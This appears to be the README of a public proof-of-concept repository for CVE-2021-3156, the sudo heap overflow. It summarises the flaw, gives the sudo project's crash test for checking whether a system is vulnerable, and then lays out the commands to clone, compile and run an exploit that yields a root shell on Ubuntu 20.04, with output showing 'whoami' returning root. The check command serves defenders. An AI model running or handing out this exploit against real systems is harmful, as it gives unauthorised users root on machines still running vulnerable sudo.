CVE-2021-3156
=============

Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via `sudoedit -s` and a command-line argument that ends with a single backslash character.

Credit to: Advisory by [Baron Samedit of Qualys](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)

### How to check if you are affected.

[The sudo project](https://www.sudo.ws/alerts/unescape_overflow.html) released a command that allows you to test whether your version of sudo is vulnerable:
```
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

If you receive a usage or error message, sudo is not vulnerable. If the result is a Segmentation fault, sudo is vulnerable.

### Usage

**Root shell PoC for CVE-2021-3156 (no bruteforce)**
Tested on Ubuntu 20.04 (sudo 1.8.31)
```
$ git clone https://github.com/CyberCommands/CVE-2021-3156.git
$ cd CVE-2021-3156
$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
$ ./exploit
# whoami
root
```
